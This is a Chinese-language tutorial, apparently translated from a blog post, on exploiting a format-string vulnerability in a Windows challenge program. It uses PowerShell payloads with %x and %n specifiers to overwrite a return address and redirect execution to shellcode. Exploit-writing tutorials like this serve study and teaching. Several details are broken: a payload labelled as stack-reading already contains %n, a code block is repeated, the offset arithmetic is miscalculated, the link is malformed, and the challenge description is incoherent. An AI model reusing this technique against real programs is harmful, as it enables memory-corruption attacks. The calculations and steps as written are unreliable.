### 利用 Windows 下的格式字符串漏洞

#### 原文链接
[Exploiting Format Strings in Windows](http://https://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/ "Exploiting Format Strings in Windows")

本文将探讨如何在 Windows 系统中利用格式字符串漏洞。我们面临的挑战是打开一个文件，但实际上这个操作并不会受到攻击。程序的第一个参数会在程序中回显。

让我们通过调试器来深入研究。如果 `argc == 2`，程序会继续执行，并将 `argv[1]` 传递给高亮显示的函数。在这个函数中，`memset` 用于将内存填充为 0，而 `strncpy` 用于复制用户输入到缓冲区。然而，值得注意的是，`printf` 函数直接调用了 `eax`，但没有指定任何格式字符串参数。这意味着 `printf` 将直接使用我们的缓冲区内容。

#### 使用 `%x` 格式字符串读取堆栈
首先，我们可以使用 `%x` 格式字符串来以十六进制格式读取堆栈。`printf` 从高地址向低地址读取堆栈内存。我们将尝试输入 80 个字符和一串 `%x` 格式字符串，观察输出。

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 21 + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

可以看到，`41` 表示十六进制的 `A`，`2558` 表示 `%X`。

#### 使用 `%n` 写入内存
接下来，我们可以使用 `%n` 来写入当前写入字符串的字符数。例如：

```c
int main() {
    int number;
    printf("Hello %nWorld", &number);
    printf("%d", number);
}
```

这将显示值 `6`。让我们尝试在输入中放置 `%n`，看看会发生什么。

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 21 + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

程序崩溃了。在调试器中，`ECX` 的值被移入 `EAX` 指向的地址。检查寄存器时，`EAX` 包含 `78257825`（即 `"x%x%"`），而 `ECX` 包含 `f8`。检查堆栈可以发现我们注入的字符。这提示我们可以使用 shellcode 而不是 `'A'` 字符。

#### 控制 EIP
在函数结尾处，一旦点击 `RET`，`EIP` 将指向堆栈中前一个函数返回的地址。如果我们检查调用堆栈，可以看到第一个帧指针指向 `0019f72c`，返回地址是 `0019f730`，它指向前一个函数的 `00401188`。注意 `0019f730` 地址前面有空字节。如果我们将这个地址以低位优先的格式写在 payload 末尾，就不会有影响。

#### 解决方案
在这个解决方案中，我们可以控制 `ECX` 和 `EAX`。我们在 `ECX` 中写入 shellcode 的地址，并在 `EAX` 寄存器中写入指向返回地址的指针。一旦程序执行 `mov dword ptr [eax], ecx`，shellcode 的地址将被写入堆栈的返回地址中。当程序到达函数末尾并触发 `LEAVE` 时，`EIP` 将指向我们新写入的地址，该地址指向我们的 shellcode。

首先，我们应该让 `EAX` 指向我们的返回地址。我的第一个 payload 如下：

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 21 + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

我们必须不断尝试，直到 `EAX` 指向 4 个 `B` 字符。我不断增加 `%x` 字符，最终使 `EAX` 指向 `BBBB`。所以，我尝试的下一个 payload 是：

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 41 + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

接下来，我们尝试让 `ECX` 寄存器指向我们的 shellcode 地址。如上图所示，shellcode 位于 `0019f758`，我们尝试把这个数字除以 4：

```powershell
0x0019f758 / 4 = 425430
```

我们将这个值赋给格式字符串 `%x`，这将改变 `ECX` 的值。同时，我会将 `%x` 的字符数从 41 增加到 51，以使 `EAX` 指向 `Bs`。这个 `%x` 一次读取 2 个字符。在达到目的之前我们必须一直尝试。

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 51 + '%.425430x' * 4 + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

现在 `ECX` 指向 `0019f940`，但我们需要让它指向 `0019f758`。我们找出其差异，并继续尝试：

```powershell
0x0019f940 - 0x0019f758 = 488
425430 + 488 = 425918
```

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 51 + '%.425430x' * 3 + '%.425918x' + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

现在 `ECX` 指向 `19fb28`，我们再来看看有什么差异：

```powershell
0x19fb28 - 0x19f758 = 976
425918 - 949 = 424942
```

```powershell
$Buffer = 'A' * 80
$fmt = '%x' * 51 + '%.425430x' * 3 + '%.424942x' + '%n'
$ret = 'B' * 4
$final = $Buffer + $fmt + $ret
Start-Process ./fmt.exe -ArgumentList $final
```

通过这些步骤，我们逐步调整 payload，最终成功控制了 `EAX` 和 `ECX`，实现了对程序的控制。